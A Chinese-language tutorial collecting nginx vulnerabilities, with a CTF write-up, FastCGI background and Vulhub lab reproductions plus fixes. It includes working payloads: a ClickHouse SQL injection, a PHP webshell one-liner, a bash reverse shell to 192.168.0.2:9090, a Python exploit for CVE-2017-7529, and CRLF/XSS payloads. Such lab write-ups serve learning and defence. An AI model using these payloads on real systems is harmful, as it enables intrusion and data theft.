此篇中介绍了很多的nginx的安全问题，做了个汇总

第一步：

nginx配置不当导致目录穿越

http://39.105.175.150:30001/files../var/lib/clickhouse/access/

有个sql文件 下载下来后拿到数据库密码


ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb';

ATTACH GRANT SELECT ON ctf.* TO user_01;

通过其自带内网的http服务登录user_01拿到flag

```php
http://39.105.175.150:30001/?id=1 union all select extractTextFromHTML(html) FROM url('http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag',RawBLOB,'html String');--
# ByteCTF{e3b0c44298fc1c149afbf4c8}
```

知识点：

fastgci等简单介绍

在网站的整体架构中，Web Server（如nginx，apache）只是内容的分发者，对客户端的请求进行应答。

如果客户端请求的是index.html这类静态页面，那么Web Server就去文件系统中找对应的文件，找到返回给客户端（一般是浏览器），在这里Web Server分发的就是是静态数据。

整个过程如下图：

![](https://img2018.cnblogs.com/blog/1211667/201901/1211667-20190114110548267-1086537722.png)

对于像index.php这类的动态页面请求，Web Server根据配置文件知道这个不是静态文件，则会调用PHP 解析器进行处理然后将返回的数据转发给客户端（浏览器）。

整个过程如下图：

![](https://img2018.cnblogs.com/blog/1211667/201901/1211667-20190114112158766-480550737.png)

在这个过程中，Web Server并不能直接处理静态或者动态请求，对于静态请求是直接查找然后返回数据或者报错信息，对于动态数据也是交付给其他的工具（这里的PHP解析器）进行处理。

那么Web Server和处理工具（这里的php-fpm）是怎样进行交互的呢？传输的是那些数据呢？这些数据的格式又是怎样的呢？

1.1.什么是CGI？
-
1）CGI（Common Gateway Interface）全称是“通用网关接口”，是一种让客户端（web浏览器）与Web服务器（nginx等）程序进行通信（数据传输）的协议。

用来规范web服务器传输到php解释器中的数据类型以及数据格式，包括URL、查询字符串、POST数据、HTTP header等，也就是为了保证web server传递过来的数据是标准格式的。

2）CGI可以用任何一种具有标准输入、输出和环境变量的语言编写，如php、perl、tcl等。

不同类型语言写的程序只要符合cgi标准，就能作为一个cgi程序与web服务器交互，早期的cgi大多都是c或c++编写的。

3）一般说的CGI指的是用各种语言编写的能实现该功能的程序。

1.2.CGI程序的工作原理
-
1）每次当web server收到index.php这种类型的动态请求后，会启动对应的CGI程序（PHP的解析器）；

2）PHP解析器会解析php.ini配置文件，初始化运行环境，然后处理请求，处理完成后将数据按照CGI规定的格式返回给web server然后退出进程；

3）最后web server再把结果返回给浏览器。

1.3.CGI程序的特点

1）高并发时的性能较差：

CGI程序的每一次web请求都会有启动和退出过程，也就是最为人诟病的fork-and-execute模式（每次HTTP服务器遇到动态请求时都需要重新启动脚本解析器来解析php.ini，重新载入全部DLL扩展并重初始化全部数据结

构，然后把结果返回给HTTP服务器），很明显，这样的接口方式会导致php的性能很差，在处理高并发访问时，几乎是不可用的。

2）传统的CGI接口方式安全性较差

3）CGI对php.ini的配置很敏感，在开发和调试的时候相当方便

1.4.CGI程序的应用领域

因为CGI为每一次请求增加一个进程，效率很低，所以基本已经不在生产部署时采用。但由于CGI对php配置的敏感性，通常被用在开发和调试阶段

2.关于FastCGI
=
2.1.什么是FastCGI？
-
通过CGI程序的工作原理可以看出：CGI程序性能较差，安全性较低，为了解决这些问题产生了FastCGI。

1）FastCGI（Fast Common Gateway Interface）全称是“快速通用网关接口”
 
 是通用网关接口（CGI）的增强版本，由CGI发展改进而来，主要用来提高CGI程序性能，
 
 类似于CGI，FastCGI也是一种让交互程序与Web服务器通信的协议

2）FastCGI致力于减少网页服务器与CGI程序之间互动的开销，从而使服务器可以同时处理更多的网页请求（提高并发访问）。

3）同样的，一般说的FastCGI指的也是用各种语言编写的能实现该功能的程序。

2.2.FastCGI程序的工作原理

1）Web Server启动同时，加载FastCGI进程管理器（nginx的php-fpm或者IIS的ISAPI或Apache的Module)

2）FastCGI进程管理器读取php.ini配置文件，对自身进行初始化，启动多个CGI解释器进程(php-cgi)，等待来自Web Server的连接。

3）当Web Server接收到客户端请求时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server会将相关环境变量和标准输入发送到FastCGI子进程php-cgi进行处理

4）FastCGI子进程完成处理后将数据按照CGI规定的格式返回给Web Server，然后关闭FastCGI子进程或者等待下一次请求。

2.3.FastCGI对进程的管理方式

Fastcgi会先启一个master，解析配置文件，初始化执行环境，然后再启动多个worker。当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然提高。而且当

worker不够用时，master可以根据配置预先启动几个worker等着；当然空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源。这就是fastcgi的对进程的管理。

2.4.FastCGI的特点：

1）FastCGI具有语言无关性，支持用大多数语言进行编写，对应的程序也支持大多数主流的web服务器

FastCGI技术目前支持语言有：C/C++，Java，PHP，Perl，Tcl，Python，SmallTalk，Ruby等。

支持FastCGI技术的主流web服务器有：Apache，Nginx，lighttpd等

2）FastCGI程序的接口方式采用C/S结构，可以将web服务器和脚本解析服务器分开，独立于web服务器运行，提高web服务器的并发性能和安全性：


提高性能：这种方式支持多个web分发服务器和多个脚本解析服务器的分布式架构，同时可以在脚本解析服务器上启动一个或者多个脚本解析守护进程来处理动态请求，可以让web服务器专一地处理静态请求或者将动态脚本

服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。


提高安全性：API方式把应用程序的代码与核心的web服务器链接在一起，这时一个错误的API的应用程序可能会损坏其他应用程序或核心服务器，恶意的API的应用程序代码甚至可以窃取另一个应用程序或核心服务器的密

钥，采用这种方式可以在很大程度上避免这个问题

3）FastCGI的不依赖于任何Web服务器的内部架构，因此即使服务器技术的变化, FastCGI依然稳定不变

4）FastCGI程序在修改php.ini配置时可以进行平滑重启加载新配置


所有的配置加载都只在FastCGI进程启动时发生一次，每次修改php.ini配置文件，只需要重启FastCGI程序（php-fpm等）即可完成平滑加载新配置，已有的动态请求会继续处理，处理完成关闭进程，新来的请求使用新

加载的配置和变量进行处理

5）FAST-CGI是较新的标准，架构上和CGI大为不同，是用一个驻留内存的服务进程向网站服务器提供脚本服务。像是一个常驻(long-live)型的CGI，维护的是一个进程池，它可以一直执行着，只要激活后，不会每次都要

花费时间去fork一次（这是CGI最为人诟病的fork-and-execute 模式），速度和效率比CGI大为提高，是目前的主流部署方式。

6）FastCGI的不足：

      因为是在内存中同时运行多进程，所以会比CGI方式消耗更多的服务器内存，每个PHP-CGI进程消耗7至25兆内存，在进行优化配置php-cgi进程池的数量时要注意系统内存，防止过量

2.5.FastCGI程序的应用领域

生产环境的主流部署方式


2.6.关于CGI和FastCGI的总结
1）CGI 和 FastCGI 都只是一种通信协议规范，不是一个实体，一般说的CGI指的是用各种语言编写的能实现该功能的程序
2）CGI 程序和FastCGI程序，是指实现这两个协议的程序，可以是任何语言实现这个协议的。（PHP-CGI 和 PHP-FPM就是实现FastCGI的程序）
3）CGI程序和FastCGI程序的区别：
关于CGI程序：
CGI使外部程序与Web服务器之间交互成为可能。CGI程序运行在独立的进程中，并对每个Web请求建立一个进程，这种方法非常容易实现，但效率很差，难以扩展。面对大量请求，进程的大量建立和消亡使操作系统性能大大下降。此外，由于地址空间无法共享，也限制了资源重用。

关于FastCGI程序：
与CGI程序为每个请求创建一个新的进程不同，FastCGI使用持续的进程（master）来处理一连串的请求。这些进程由FastCGI服务器管理，而不是web服务器。 当进来一个请求时，web服务器把环境变量和这个页面请求通过一个socket或者一个TCP connection传递给FastCGI进程。
3.关于PHP-CGI，PHP-FPM和Spawn-FCGI
=
3.1.PHP-CGI是什么？
-

很多地方说：PHP-CGI是PHP自带的FastCGI管理器，目前还没找到最原始的出处，以我的理解和经验来看这话有点毛病，我认为应该是：使用php实现CGI协议的CGI程序，可以用来管理php解释器，如果有异议可以和我探

讨下。。。

使用如下命令可以启动PHP-CGI：

php-cgi -b 127.0.0.1:9000

php-cgi的特点：

1）php-cgi变更php.ini配置后需重启php-cgi才能让新的配置生效，不可以平滑重启

2）直接杀死php-cgi进程php就不能运行了

3.2.关于php-fpm

PHP-FPM(FastCGI Process Manager)

针对PHP-CGI的不足，PHP-FPM和Spawn-FCGI应运而生，它们的守护进程会平滑从新生成新的子进程。 

1）PHP-FPM使用PHP编写的PHP-FastCGI管理器，管理对象是PHP-CGI程序，不能说php-fpm是fastcgi进程的管理器，因为前面说了fastcgi是个协议

下载地址：http://php-fpm.org/download

早期的PHP-FPM是作为PHP源码的补丁而使用的，在PHP的5.3.2版本中直接整合到了PHP-FPM分支，目前主流的PHP5.5，PHP5.6，PHP5.7已经集成了该功能（被官方收录）

在配置时使用--enable-fpm参数即可开启PHP-FPM

2）修改php.ini之后，php-cgi进程的确是没办法平滑重启的。php-fpm对此的处理机制是新的worker用新的配置，已经存在的worker处理完手上的活就可以歇着了，通过这种机制来平滑过度。


由此便引出了今天的主角：CGI

Nginx原理介绍
-

本文介绍的是Nginx的漏洞，以PHP语言为主。像Apache一样，Nginx自身是不支持解析PHP语言的，只能通过加载PHP模块来解析PHP。原理图可以看下图：

![](https://pic1.zhimg.com/80/v2-c1d74386f2e11a6638f2c71cc55e2924_1440w.jpg)

这里有几个定义：


CGI：CGI是一种协议，它定义了Nginx或者其他Web Server传递过来的数据格式，全称是（Common Gateway Interface，CGI），CGI是一个独立的程序，独立与WebServer之外，任何语言都可以写CGI程序，例如C、

Perl、Python等。

FastCGI：FastCGI是一种协议，它的前身是CGI，可以简单的理解为是优化版的CGI，拥有更够的稳定性和性能。

PHP-CGI：只是一个PHP的解释器，本身只能解析请求，返回结果，不会做进程管理。

PHP-FPM：全称FastCGI Process Manager，看名称就可以知道，PHP-FPM是FastCGI进程的管理器，但前面讲到FastCGI是协议并不是程序，所以它管理的是PHP-CGI，形成了一个类似PHP-CGI进程池的概念。

Wrapper：字母意思是包装的意思，包装的是谁呢？包装的是FastCGI，通过FastCGI接口，Wrapper接收到请求后，会生成一个新的线程调用PHP解释器来处理数据。

Nginx调用PHP的过程是比较复杂的，需要花大量的时间来学习和梳理。通过原理图和刚才的定义，我们对Nginx处理PHP请求有了大致的了解。那么，Nginx是如何知道将什么样的文件当作PHP文件处理？是在nginx.conf

配置文件中的

```php
location ~ \.php$ {
    root           html;
    include        fastcgi_params;

    fastcgi_pass   IP:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
    fastcgi_param  DOCUMENT_ROOT /var/www/html;
}
```

location后面的\.php$代表了以.php结尾的文件都安装花括号中的内容执行，其中fastcgi_pass就是nginx和php-fpm的媒介，Nginx将请求通过fastcgi_pass转发给php-fpm。fastcgi_pass可以和Nginx不在同一台

服务器上，他们通过IP+PORT的方式进行通信。

1.CVE-2013-4547（文件名逻辑漏洞）
-

影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7

影响说明：绕过服务器策略，上传webshell

环境说明：Nginx 1.4.2

环境搭建：
此次环境使用docker环境搭建，环境采用地址Vulhub

执行构建环境命令如下（启动后在浏览器中访问http://127.0.0.1:8080）


该漏洞利用了Nginx错误的解析了URL地址，导致可以绕过服务端限制，从而解析PHP文件，造成命令执行的危害。

根据nginx.conf文件中location中的定义，以.php结尾的文件都解析为php。若我们访问的文件名为shell.gif[0x20][0x00].php，该文件名以.php结尾可以被FastCGI接收，FastCGI在读取文件名时被00截断，导致

读取的文件名为1.gif[0x20]，配合limit_extensions为空即可利用成功。该漏洞利用条件有两个：

Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7

php-fpm.conf中的security.limit_extensions为空，也就是说任意后缀名都可以解析为PHP

Nginx版本范围较大，比较好匹配，但php-fpm.conf的security.limit_extensions配置默认为php，一般鲜有管理员允许所有类型都可以解析为PHP，所以该漏洞比较鸡肋，但这是在Linux的服务器中，而在Windows中

便影响极大，这点我们后面再讲，先说下在Linux下的复现步骤。

0x01 查看phpinfo

上传一个shell.gif11，抓包后将gif后的11改为20与00，然后上传。

![](https://pic2.zhimg.com/80/v2-aec6c9dd94a982b9fa9aeefee1c68755_1440w.jpg)

可以发现上传成功，此时使用http://127.0.0.1:8080/uploadfiles/shell.png[0x20][0x00].php 便可以访问phpinfo

![](https://pic3.zhimg.com/80/v2-a0c01f8c5f81f147e70cc436c407b0ee_1440w.jpg)

0x02 执行系统命令，一句话代码如下

<?php system($_GET['var']); ?>

执行结果：

0x03 反弹shell

#利用0x02中的一句话木马反弹shell，var的参数如下

bash -i >& /dev/tcp/192.168.0.2/9090 0>&1

# 在本地执行监听

nc -l 9090

2.CVE-2017-7529（Nginx越界读取缓存漏洞）
-

影响版本：Nginx 0.5.6 ~ 1.13.2

影响说明：信息泄漏

环境说明：Nginx 1.13.2

环境搭建：

此次环境使用docker环境搭建，环境采用地址Vulhub

执行构建环境命令如下（启动后在浏览器中访问http://127.0.0.1:8080）


docker-compose build

docker-compose up -d

Nginx越界读取缓存漏洞产生的原因是Nginx读取http请求时，如果包含range，那么Nginx会根据range指定的数据范围读取文件数据内容，如果该range是负数，并且读到了缓存文件，那么会返回缓存文件中的“文件

头”或“HTTP返回包头”，缓存文件头可能包含IP地址的后端服务器或其他敏感信息，从而导致信息泄露。

概念介绍：

0x01 range是什么？

存在于HTTP请求头中，表示请求目标资源的部分内容，例如请求一个图片的前半部分，单位是byte，原则上从0开始，但今天介绍的是可以设置为负数。

range的典型应用场景例如：断点续传、分批请求资源。

range在HTTP头中的表达方式：

Range:bytes=0-1024 表示访问第0到第1024字节；

Range:bytes=100-200,601-999,-300 表示分三块访问，分别是100到200字节，601到600字节，最后的300字节；

Range:-100 表示访问最后的100个字节

range在HTTP Response表示：

Accept-Ranges:bytes 表示接受部分资源的请求；

Content-Range: bytes START-END/SIZE  START-END表示资源的开始和结束位置，SIZE表示资源的的长度

0x02 缓存是什么？

大多数的Web服务器都具有缓存的功能，解释起来比较麻烦，可以看下图：

![](https://pic1.zhimg.com/80/v2-2fd1f41c9d194c7479663dd6f6f6e9ec_1440w.jpg)

当请求服务器的资源时，如果在缓存服务器中存在，则直接返回，不在访问应用服务器，可以降低应用服务器的负载。

例如网站的首页的缓存，nginx的默认缓存路径在/tmp/nginx下，例如：当请求服务器的资源时，如果在缓存服务器中存在，则直接返回，不在访问应用服务器，可以降低应用服务器的负载。

例如网站的首页的缓存，nginx的默认缓存路径在/tmp/nginx下，例如：


![](https://pic2.zhimg.com/80/v2-77c610b030872a8d23288d9339897aed_1440w.jpg)

再次访问该页面时会首先读取该缓存内容，其他的静态资源，例如：图片、CSS、JS等都会被缓存。

0x03 漏洞利用

1、现在我要读取刚才讲到的缓存文件头，他的Content-Length时612，那么我读取正常缓存文件的range是设置为

Range: bytes=0-612

使用curl工具测试下，命令如下,执行后发现，返回的内容是正常的。

curl -i http://127.0.0.1:8080 -r 0-612

2、接下来要读取缓存头，读取前面600个字节，也就是

range=content_length + 偏移长度

即：

range = 612 + 600

取负值为-1212

此时知道range的start是-1212，那么end呢？nginx的源码在声明start,end时用的是64位有符号整型，所以最大可表示：

-2^63-2^63-1

也就是

-9223372036854775808 到 9223372036854775807

所以只要start+end为9223372036854775807即可，故：

end = 9223372036854775808 - 1212

取负

为-9223372036854774596

执行结果为下图，可以发现读取到了缓存文件头，里面的8081端口在实际的业务场景中可能是其他的地址，这样便会造成信息泄漏。

![](https://pic3.zhimg.com/80/v2-b8f7bc96a90c87e9212cc636f16b677e_1440w.jpg)

利用代码

```python
# -*- coding: UTF-8 -*-
#!/usr/bin/env python

import sys
import requests

if len(sys.argv) < 2:
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8080/ offset" % (sys.argv[0]))
    sys.exit()

headers = {}
offset = int(sys.argv[2])
url = sys.argv[1]

file_len = len(requests.get(url, headers=headers).content)
n = file_len + offset

headers['Range'] = "bytes=-%d,-%d" % (
    n, 0x8000000000000000 - n)

r = requests.get(url, headers=headers)
print(r.text)
```
3.ngnix配置不当导致目录穿越
-

Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。

错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：

利用方法：

![](https://img-blog.csdnimg.cn/20181116174450974.png)

穿越上层目录

![](https://img-blog.csdnimg.cn/20181116174455219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70)

漏洞修复

![](https://img-blog.csdnimg.cn/20181116174504524.png)

![](https://img-blog.csdnimg.cn/20181116174507397.png)

crlf注入：
-

什么是crlf注入：

回车换行（CRLF）注入攻击是一种当用户将CRLF字符插入到应用中而触发漏洞的攻击技巧。CRLF字符（%0d%0a）在许多互联网协议中表示行的结束，包括HTML，该字符解码后即为\ r\ n。这些字符可以被用来表示换行符，并且当该字符与HTTP协议请求和响应的头部一起联用时就有可能会出现各种各样的漏洞，包括http请求走私（HTTP RequestSmuggling）和http响应拆分（HTTP Response Splitting）。

CRLF 指的是回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)，操作系统就是根据这个标识来进行换行的，你在键盘输入回车键就是输出这个字符，只不过win和linux系统采用的标识不一样而已。

在HTTP当中HTTP的Header和Body之间就是用两个crlf进行分隔的，如果能控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以CRLF injection 又叫做 HTTP response Splitting，简称HRS。CRLF漏洞可以造成Cookie会话固定和反射型XSS(可过waf)的危害，注入XSS的利用方式：连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。


测试

CRLF注入漏洞的检测也和XSS漏洞的检测差不多。通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。主要是在看到有重定向或者跳转的地方，可以在跳转的地址添加?url=http://baidu.com/xxx%0a%0dSet-Cookie: test123=123测试一下，通过查看响应包的数据查看结果。

GET /index.php?c=rpzy&a=query&type=all&value=123&datatype=json&r=X1MU6E86%0a%0dSet-Cookie: test123=123 HTTP/1.1
Host: www.xxxxyou.net


这里并没有利用成功，如果利用成功的话，响应包会出现一行Set-Cookie: test123=123 数据。


原理分析

HRS漏洞存在的前提是 ：url当中输入的字符会影响到文件，比如在重定位当中可以尝试使用%0d%0a作为crlf.

一般网站会在HTTP头中加上Location: http://baidu.com的方式来进行302跳转，所以我们能控制的内容就是Location:后面的XXX网址，对这个地址进行污染。

假设服务端（PHP）的处理方式：
```php
if($_COOKIE("security_level") == 1)
{
    header("Location: ". $_GET['url']);
    exit;
}
```
代码意思是说当条件满足时，将请求包中的url参数值拼接到Location字符串中，并设置成响应头发送给客户端。

此时服务器端接收到的url参数值是我们修改后的：

http://baidu.com/xxx%0a%0dSet-Cookie: test123=123

在url参数值拼接到Location字符串中，设置成响应头后，响应头就会看到：

Set-Cookie: test123=123

修复方式

服务端收到前端过来的参数，在加入Location之前，需要过滤 \r 、\n 之类的行结束符，避免输入的数据污染其它HTTP首部字段。

漏洞原理

```php

Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。

错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：

location / {
    return 302 https://$host$uri;
}

利用方式

访问 192.168.91.130:8080

正常跳转

![](https://img-blog.csdnimg.cn/20181116173700538.png)

会话固定

payload

http://192.168.91.130:8080/%0ASet-cookie:JSPSESSID%3D360

![](https://img-blog.csdnimg.cn/20181116173708141.png)

返回包

![](https://img-blog.csdnimg.cn/20181116173713712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70)

反射性XSS

payload

http://192.168.91.130:8080/%0D%0A%0D%0A%3Cimg%20src=1%20onerror=alert(/xss/)%3E

https://img-blog.csdnimg.cn/20181116174035141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70

为什么没弹窗？

浏览器Filter对XSS特征进行了过滤，并且浏览器进行了跳转如何阻止浏览器跳转，参考链接：

https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html

https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html


漏洞修复
```php
location /{
return 302 https://$host$request_uri
}
```
使用不解码的跳转方式

ngnix漏洞3 add_header被覆盖
-
Nginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。

如下列代码，整站（父块中）添加了CSP头：

```php
add_header Content-Security-Policy "default-src 'self'";
add_header X-Frame-Options DENY;
location = /test1 {
    rewrite ^(.*)$ /xss.html break;
}
location = /test2 {
    add_header X-Content-Type-Options nosniff;
    rewrite ^(.*)$ /xss.html break;
}
```

但/test2的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效：

![](https://nc0.cdn.zkaq.cn/md/6508/02483addcfc297e89b0636d98792d82a_52328.png)

XSS可被触发：

![](![image](https://user-images.githubusercontent.com/87234369/138077590-596fd965-5a37-4552-8d60-eac82d9b8512.png)

什么是csp头：
-

Content-Security-Policy

跨域脚本攻击（XSS）是最常见、危害最大的网页安全漏洞。

为了防止它，要采取很多编程措施（比如大多数人都知道的转义、过滤HTML）。很多人提出，能不能根本上解决问题，即浏览器自动禁止外部注入恶意脚本？

这就是"内容安全策略"（Content Security Policy，缩写 CSP）的由来。

两种方法可以启用 CSP：

设置 HTTP 的 Content-Security-Policy 头部字段
设置网页的<meta>标签。
网上的资料都有讲到它们怎么使用，但是很少有代码演示，不敲一遍就不够理解，下面我会直接上些例子。
（1）使用HTTP的 Content-Security-Policy头部
在服务器端使用 HTTP的 Content-Security-Policy头部来指定你的策略，像这样:

Content-Security-Policy: policy
policy参数是一个包含了各种描述CSP策略指令的字符串。

x-content-type-options头
-


如果服务器发送响应头 "X-Content-Type-Options: nosniff"，则 script 和 styleSheet 元素会拒绝包含错误的 MIME 类型的响应。这是一种安全功能，有助于防止基于 MIME 类型混淆的攻击。

 

简单理解为：通过设置"X-Content-Type-Options: nosniff"响应标头，对 script 和 styleSheet 在执行是通过MIME 类型来过滤掉不安全的文件

服务器发送含有 "X-Content-Type-Options: nosniff" 标头的响应时，此更改会影响浏览器的行为。

 

如果通过 styleSheet 参考检索到的响应中接收到 "nosniff" 指令，则 Windows Internet Explorer 不会加载“stylesheet”文件，除非 MIME 类型匹配 "text/css"。

如果通过 script 参考检索到的响应中接收到 "nosniff" 指令，则 Internet Explorer 不会加载“script”文件，除非 MIME 类型匹配以下值之一：

 

"application/ecmascript"

"application/javascript"

"application/x-javascript"

"text/ecmascript"

"text/javascript"

"text/jscript"

"text/x-javascript"

"text/vbs"

"text/vbscript"


漏洞防御

在/test2的location中删除X-Content-Type-Options头



 nginx 解析漏洞
 -
 
 访问http://URL/uploadfiles/nginx.png和http://URL/uploadfiles/nginx.png/.php即可查看效果
 
 ![](https://nc0.cdn.zkaq.cn/md/6508/f6756c4335842e461236fe30e1ffb721_93045.png)
 
 增加/.php后缀，被解析成PHP文件：
 
 ![](https://nc0.cdn.zkaq.cn/md/6508/c5e37c89df45c215a04d74b23756ee65_13165.png)
 
 也可配合文件上传来getshell。此处不再演示。
 
 一、漏洞描述

该漏洞与nginx、php版本无关,属于用户配置不当造成的解析漏洞

二、漏洞原理

1、由于nginx.conf的如下配置导致nginx把以’.php’结尾的文件交给fastcgi处理,为此可以构造http://ip/uploadfiles/test.png/.php (url结尾不一定是‘.php’,任何服务器端不存在的php文件均可,比如’a.php’),其中test.png是我们上传的包含PHP代码的照片文件。

![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200512101147825-1370930573.png)

2、但是fastcgi在处理’.php’文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了’/test.png’。

3、最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将’.png’等文件当做代码解析。

![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200512101555612-1228189520.png)

三、漏洞复现
1、进入vulhub-master的nginx/nginx_parsing_vulnerability目录下
2、docker启动环境

dcoker-compose up -d
3、浏览器访问192.168.2.147
![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200512091538346-426976079.png)

4、在“010editor”上修改图片hex数据
![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200512094918749-2179269.png)


也可以修改burp提交的数据

![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200512095236523-493637483.png)

5、访问http://192.168.2.147uploadfiles/c2f650ad06f7754d7afd1c6a3e4a5ee8.jpg/.php

如图，成功解析图片中的php代码，说明系统存在nginx解析漏洞
![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200512095550957-158212943.png)

四、漏洞修复
1、修改限制FPM执行解析的扩展名

![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200512102645572-1827315611.png)

2、重新启动docker环境

![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200512102733661-195624694.png)

3、验证漏洞已经修复

![](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200512102811285-1604977674.png)

五、漏洞影响范围

1、 将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面

2、 php-fpm.conf中的security.limit_extensions后面的值设置为.php

在浏览器中访问 http://127.0.0.1/test.jpg 显示图片解析错误。在浏览器中访问 http://127.0.0.1/test.jpg/test.php ，显示：“Access denied.” 。这就有意思了，test.jpg是文件不是目录，test.php更是根本就不存在的文件，访问/test.jpg/test.php没有报404，而是显示“Access denied.” 。

Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回“Access denied.”。

这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项有什么用呢？看名字就知道是对文件路径进行“修理”。何谓“修理”？举个例子，当php遇到文件路径“/aaa.xxx/bbb.yyy/ccc.zzz”时，若“/aaa.xxx/bbb.yyy/ccc.zzz”不存在，则会去掉最后的“/ccc.zzz”，然后判断“/aaa.xxx/bbb.yyy”是否存在，若存在，则把“/aaa.xxx/bbb.yyy”当做文件“/aaa.xxx/bbb.yyy/ccc.zzz”，若“/aaa.xxx/bbb.yyy”仍不存在，则继续去掉“/bbb.yyy”，以此类推。

该选项在配置文件php.ini中。若是关闭该选项，访问 http://127.0.0.1/test.jpg/test.php 只会返回找不到文件。但关闭该选项很可能会导致一些其他错误，所以一般是开启的。

目前我们还没能成功执行代码，因为新版本的php引入了“security.limit_extensions”，限制了可执行文件的后缀，默认只允许执行.php文件。来做进一步测试。找到php5-fpm配置文件php-fpm.conf，若不知道在哪，可用如下命令搜索：

sudo find / -name php-fpm.conf


我的测试环境中，该文件位于/etc/php5/fpm/php-fpm.conf。修改该文件中的“security.limit_extensions”，添加上.jpg，添加后如下所示：
  security.limit_extensions = .php .jpg
  
  由上述原理可知，http://127.0.0.1/test.jpg/test.xxx/test.php 也是可以执行的。

上面的测试均在Nginx1.4.6中进行。这一漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于“security.limit_extensions”的引入，使得该漏洞难以被成功利用。

为何是Nginx中的php才会有这一问题呢？因为Nginx只要一看URL中路径名以.php结尾，便不管该文件是否存在，直接交给php处理。而如Apache等，会先看该文件是否存在，若存在则再决定该如何处理。cgi.fix_pathinfo是php具有的，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。（2017.08.15：IIS在这一点和Nginx是一样的，同样存在这一问题）

做个小实验，分别访问两个不存在的文件123123.xxx和123123.php，虽然都返回404，但一看页面，也该知这两个文件的处理流程是不同的。

下图是访问123123.xxx的结果，404由Nginx给出：

![](https://img-blog.csdn.net/20170818215241413)

下图是访问123123.php的结果，404页面和上图不同：

![](https://img-blog.csdn.net/20170818215307077)

查看错误日志，找到了：

  FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 127.0.0.1, server: localhost, request: "GET /123123.php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php5-fpm.sock:", host: "127.0.0.1"

由此可知Nginx确实只看了后缀就直接把123123.php交给php处理了，这一文件不存在也是php做出的判断。

ngnix 00截断
-
影响范围：

  0.5.， 0.6.， 0.7 <= 0.7.65， 0.8 <= 0.8.37 ?

利用方式：

  /test.jpg%00.php

测试：

服务器为Nginx1.4.6，浏览器中访问 http://127.0.0.1/test.jpg%00.php ，返回“400 Bad Request”，代码未执行，测试失败。实在是安不好又找不到这么老的Nginx，遂放弃测试。

%00截断似乎是一个大类，什么时候有空专门研究下。

CVE-2013-4547
-

CVE-2013-4547是一个还算新的漏洞，影响范围也比较大：
 
 0.8.41～1.4.3， 1.5 <= 1.5.7

顺便一提，截止本文写作时，Nginx的最新版本是1.13.4 。

这一漏洞的原理是非法字符空格和截止符（\0）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。是什么意思呢？举个例子，假设服务器上存在文件：“file.aaa ”，注意文件名的最后一个字符是空格。则可以通过访问：

http://127.0.0.1/file.aaa \0.bbb

让Nginx认为文件“file.aaa ”的后缀为“.bbb”。

